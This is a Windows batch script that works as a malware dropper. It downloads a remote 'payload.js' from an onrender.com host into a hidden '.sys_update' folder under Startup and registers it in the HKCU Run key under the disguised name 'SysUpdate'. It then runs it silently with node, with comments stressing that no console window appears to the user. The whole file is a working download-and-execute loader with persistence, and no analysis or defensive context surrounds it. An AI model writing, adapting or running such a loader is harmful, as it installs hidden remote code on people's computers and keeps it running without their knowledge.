@echo off
setlocal enabledelayedexpansion

:: --- CONFIGURATION ---
:: Define the directory path WITHOUT quotes so variable expansion works cleanly
set "DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.sys_update"
set "PAYLOAD_URL=https://payload-x3rf.onrender.com/payload.js"
set "LOCAL_PAYLOAD=%DIR%\payload.js"

:: --- STEP 1: Ensure Directory Exists ---
if not exist "%DIR%" mkdir "%DIR%" 2>nul

:: --- STEP 2: Download Latest Payload ---
:: Always download to ensure we have the latest version (overwrites old ones)
powershell -Command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%LOCAL_PAYLOAD%'" >nul 2>&1

:: Check if download was successful
if not exist "%LOCAL_PAYLOAD%" (
    echo [ERROR] Failed to download payload.js
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysUpdate" /v "LastStatus" /t REG_SZ /d "DownloadFailed" /f
    exit /b 1
)

:: Check if file is empty (corrupt download)
for %%F in ("%LOCAL_PAYLOAD%") do if %%~zF==0 (
    echo [ERROR] Downloaded payload.js is empty
    del "%LOCAL_PAYLOAD%"
    exit /b 1
)

:: --- STEP 3: Register Persistence ---
:: Use cmd /c start "" /b to launch node silently without a console window
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "cmd /c start \"\" /b node \"%LOCAL_PAYLOAD%\"" /f

:: --- STEP 4: Execute Payload Immediately ---
:: Launch node in the background immediately after installation
:: Using 'start ""' ensures no console window appears for the user
start "" /b node "%LOCAL_PAYLOAD%"

:: Optional: Log success for debugging
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysUpdate" /v "LastStatus" /t REG_SZ /d "InstalledAndRunning" /f

exit
